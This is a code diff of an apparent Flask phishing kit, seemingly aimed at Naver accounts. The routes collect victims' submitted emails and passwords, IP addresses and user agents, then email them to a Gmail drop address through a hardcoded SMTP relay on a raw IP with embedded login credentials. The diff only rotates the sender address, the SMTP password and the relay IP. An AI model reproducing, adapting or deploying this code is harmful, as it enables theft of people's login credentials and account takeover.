@@ -145,10 +145,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "contact@personalbio.site"
-        sender_emaill = "contact"
+        sender_email = "contant@greenscience.bio"
+        sender_emaill = "contant"
         receiver_email = "tophiwebs@gmail.com"
-        password = "vip79d01760b097"
+        password = "vipd668e509527f"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "NAVERLOOK l0GS ! 1"
@@ -164,7 +164,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("91.217.246.43", 6040) as server:
+        with smtplib.SMTP("5.149.253.103", 6040) as server:
             server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
@@ -183,10 +183,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "contact@personalbio.site"
-        sender_emaill = "contact"
+        sender_email = "contant@greenscience.bio"
+        sender_emaill = "contant"
         receiver_email = "tophiwebs@gmail.com"
-        password = "vip79d01760b097"
+        password = "vipd668e509527f"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "NAVERLOOKS l0GS !! 2"
@@ -202,7 +202,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("91.217.246.43", 6040) as server:
+        with smtplib.SMTP("5.149.253.103", 6040) as server:
             server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('lasmo'))
